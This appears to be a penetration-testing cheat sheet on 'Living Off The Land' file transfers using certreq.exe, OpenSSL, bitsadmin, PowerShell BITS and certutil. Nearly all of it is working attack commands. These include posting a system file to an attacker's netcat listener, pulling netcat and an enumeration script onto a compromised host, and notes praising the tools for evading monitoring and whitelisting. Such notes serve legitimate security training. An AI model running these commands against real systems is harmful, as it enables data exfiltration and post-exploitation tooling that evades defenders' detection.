# Living Off The Land

Living Off The Land (LOL) techniques use legitimate system tools, binaries, scripts, and libraries that are already present on a system to perform file transfers and other operations. This approach avoids downloading custom tools, making detection more difficult and leveraging built-in system functionality.

## Summary

1. [certreq.exe - Upload File](#certreqexe---upload-file)
2. [OpenSSL - File Transfer via TLS](#openssl---file-transfer-via-tls)
3. [Bitsadmin - Background Intelligent Transfer Service](#bitsadmin---background-intelligent-transfer-service)
4. [Certutil - Certificate Utility](#certutil---certificate-utility)

## certreq.exe - Upload File

Windows certificate request tool that can be used to upload files to a remote server.

### Setup

```bash
# On target/attacker machine - listen for incoming data
sudo nc -lvnp 8000
```

### Upload File

```cmd
# On Windows host - upload file using certreq.exe
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

**How it works:** The `certreq.exe` command uses the `-Post` flag to send a certificate request (or file) to the specified URL. The file content is sent as part of the HTTP POST request to the netcat listener.

**Note:** This method requires the target machine to have network access to your listening server.

## OpenSSL - File Transfer via TLS

Using OpenSSL's built-in server/client for encrypted file transfer over TLS. This is useful when you need secure file transfer using only native tools.

### Create Certificate

```bash
# Create Certificate in Pwnbox/Attacker Machine
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

### Setup Server with Certificate

```bash
# Setup Server on Pwnbox - serves file via TLS on port 80
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**Explanation:**
- `s_server` - OpenSSL TLS server
- `-quiet` - Suppress verbose output
- `-accept 80` - Listen on port 80
- `< /tmp/LinEnum.sh` - Pipes file content to clients upon connection

### Download File from Compromised Machine

```bash
# Download File from Compromised Machine
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

**Explanation:**
- `s_client` - OpenSSL TLS client
- `-connect 10.10.10.32:80` - Connect to server IP and port
- `> LinEnum.sh` - Save received data to file

**Advantages:**
- Uses native OpenSSL (commonly installed)
- Encrypted transfer via TLS
- Works through firewalls (uses port 80)
- No custom tools required

## Bitsadmin - Background Intelligent Transfer Service

Windows built-in tool for downloading files using the Background Intelligent Transfer Service (BITS).

### Download File with Bitsadmin

```cmd
# Command-line method
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**Parameters:**
- `/transfer wcb` - Create a transfer job named "wcb"
- `/priority foreground` - Set priority to foreground (download immediately)
- URL and destination path

### Download File with PowerShell BITS Transfer

```powershell
# PowerShell method using BitsTransfer module
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Alternative one-liner:**

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

**Advantages:**
- Native Windows tool (available by default)
- Can run in background
- Resumable downloads
- Often less monitored than direct HTTP downloads

## Certutil - Certificate Utility

Windows certificate utility that can download and decode files, often used for file transfer in penetration testing.

### Download File with Certutil

```cmd
# Download file using certutil
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

# Alternative syntax (downloads to current directory with original filename)
certutil.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe nc.exe
```

**Parameters:**
- `-verifyctl` - Verify the certificate store
- `-split` - Split embedded ASN.1 elements and save to files
- `-f` - Force overwrite existing files
- `-urlcache` - Access or delete URL cache entries

**Note:** The `-verifyctl` flag is deprecated but still works in older Windows versions. Modern versions may prefer `-urlcache -split -f` syntax.

**Advantages:**
- Native Windows tool (present on all Windows systems)
- Can encode/decode Base64 files
- Often whitelisted in security policies
- Useful for downloading files during post-exploitation